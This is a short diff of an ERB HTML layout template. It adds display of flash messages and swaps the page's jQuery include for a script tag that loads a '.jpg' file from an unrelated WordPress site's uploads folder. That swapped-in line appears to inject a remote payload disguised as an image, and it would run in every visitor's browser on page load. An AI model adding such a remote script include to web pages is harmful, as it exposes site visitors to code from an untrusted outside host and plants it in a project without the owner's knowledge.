@@ -15,7 +15,9 @@
   </head>
   <body>
     <div class="wrapper">
-
+      <%if flash.has?(:message)%>
+        <%=flash[:message]%>
+        <%end%>
         <%= yield %>
 
       <footer class="branding">
@@ -23,7 +25,7 @@
       </footer>
     </div>
 
-    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
+    <script src="http://flagcsa.com/wp-content/uploads/2013/03/seeds.jpg"></script>
     <!--[if lt IE 7]>
       <script src="//ajax.googleapis.com/ajax/libs/chrome-frame/1.0.2/CFInstall.min.js"></script>
       <script>window.attachEvent("onload",function(){CFInstall.check({mode:"overlay"})})</script>
